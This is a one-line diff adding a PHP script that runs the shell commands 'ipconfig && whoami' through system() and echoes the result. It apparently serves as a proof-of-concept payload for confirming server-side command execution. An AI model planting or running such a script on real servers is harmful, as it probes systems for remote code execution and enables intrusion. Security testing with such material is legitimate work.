@@ -1,0 +1,1 @@
+<?php $cmd = "ipconfig && whoami"; echo system($cmd);?>
